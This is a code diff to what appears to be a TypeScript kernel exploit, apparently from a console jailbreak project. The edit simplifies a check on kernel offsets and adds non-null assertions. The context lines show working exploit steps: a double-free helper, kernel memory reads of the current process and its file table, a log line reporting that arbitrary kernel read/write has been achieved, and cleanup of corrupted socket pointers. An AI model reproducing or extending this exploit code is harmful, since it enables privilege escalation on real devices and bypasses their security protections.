@@ -1613,12 +1613,12 @@ function double_free_reqs1 (reqs1_addr: BigInt, target_id: number, evf: BigInt, 
 function make_kernel_arw (pktopts_sds: BigInt[], reqs1_addr: BigInt, kernel_addr: BigInt, sds: BigInt[], sds_alt: BigInt[], aio_info_addr: BigInt) {
   try {
     const kernelOffset = kernel_offset
-    if (!kernelOffset || !kernelOffset.IP6PO_TCLASS || !kernelOffset.PROC_PID || !kernelOffset.PROC_FD || !kernelOffset.FILEDESC_OFILES || !kernelOffset.SO_PCB || !kernelOffset.INPCB_PKTOPTS || !kernelOffset.SIZEOF_OFILES || !kernelOffset.IP6PO_RTHDR) {
+    if (!kernelOffset) {
       throw new Error('kernel_offset not initialized')
     }
     const master_sock = pktopts_sds[0]!
     const tclass = malloc(4)
-    const off_tclass = kernelOffset.IP6PO_TCLASS
+    const off_tclass = kernelOffset.IP6PO_TCLASS!
 
     const pktopts_size = 0x100
     const pktopts = malloc(pktopts_size)
@@ -1703,7 +1703,7 @@ function make_kernel_arw (pktopts_sds: BigInt[], reqs1_addr: BigInt, kernel_addr
       return null
     }
 
-    const possible_pid = Number(slow_kread8(curproc.add(kernelOffset.PROC_PID)))
+    const possible_pid = Number(slow_kread8(curproc.add(kernelOffset.PROC_PID!)))
     const current_pid = Number(getpid())
 
     if ((possible_pid & 0xffffffff) !== (current_pid & 0xffffffff)) {
@@ -1714,8 +1714,8 @@ function make_kernel_arw (pktopts_sds: BigInt[], reqs1_addr: BigInt, kernel_addr
     log('curproc = ' + hex(curproc))
 
     kernel.addr.curproc = curproc
-    kernel.addr.curproc_fd = slow_kread8((kernel.addr.curproc).add(kernelOffset.PROC_FD))
-    kernel.addr.curproc_ofiles = slow_kread8(kernel.addr.curproc_fd).add(kernelOffset.FILEDESC_OFILES)
+    kernel.addr.curproc_fd = slow_kread8((kernel.addr.curproc).add(kernelOffset.PROC_FD!))
+    kernel.addr.curproc_ofiles = slow_kread8(kernel.addr.curproc_fd).add(kernelOffset.FILEDESC_OFILES!)
     kernel.addr.inside_kdata = kernel_addr
 
     const get_fd_data_addr = (sock: BigInt, kread8_fn: (addr: BigInt) => BigInt | null) => {
@@ -1796,7 +1796,7 @@ function make_kernel_arw (pktopts_sds: BigInt[], reqs1_addr: BigInt, kernel_addr
     log('Arbitrary kernel r/w achieved!')
 
     // RESTORE: clean corrupt pointers
-    const off_ip6po_rthdr = kernelOffset.IP6PO_RTHDR
+    const off_ip6po_rthdr = kernelOffset.IP6PO_RTHDR!
 
     for (let i = 0; i < sds.length; i++) {
       const sock_pktopts = get_sock_pktopts(sds[i]!, kernel.read_qword)
